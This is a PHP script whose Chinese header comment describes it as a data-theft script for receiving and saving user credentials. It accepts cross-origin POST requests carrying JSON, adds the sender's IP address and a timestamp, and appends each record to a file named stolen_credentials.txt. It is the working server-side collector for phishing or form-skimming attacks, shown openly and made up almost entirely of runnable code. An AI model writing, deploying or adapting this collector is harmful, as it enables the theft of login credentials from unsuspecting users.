<?php
/**
 * 数据窃取脚本 - 接收并保存用户凭据
 * 
 * @author  Guojin0826
 * @email   jinrcsy@gmail.com
 * @github  https://github.com/Guojin0826
 */

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    exit(0);
}

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // 获取POST数据
    $json = file_get_contents('php://input');
    $data = json_decode($json, true);
    
    if ($data) {
        // 添加额外信息
        $data['ip'] = $_SERVER['REMOTE_ADDR'];
        $data['time'] = date('Y-m-d H:i:s');
        
        // 保存到文件
        $logFile = __DIR__ . '/data/stolen_credentials.txt';
        
        // 确保data目录存在
        if (!is_dir(__DIR__ . '/data')) {
            mkdir(__DIR__ . '/data', 0755, true);
        }
        $existingData = [];
        
        if (file_exists($logFile)) {
            $existingData = json_decode(file_get_contents($logFile), true) ?: [];
        }
        
        $existingData[] = $data;
        file_put_contents($logFile, json_encode($existingData, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        
        echo json_encode(['status' => 'success', 'message' => '数据已保存']);
    } else {
        echo json_encode(['status' => 'error', 'message' => '无效数据']);
    }
} else {
    echo json_encode(['status' => 'error', 'message' => '仅支持POST请求']);
}
?>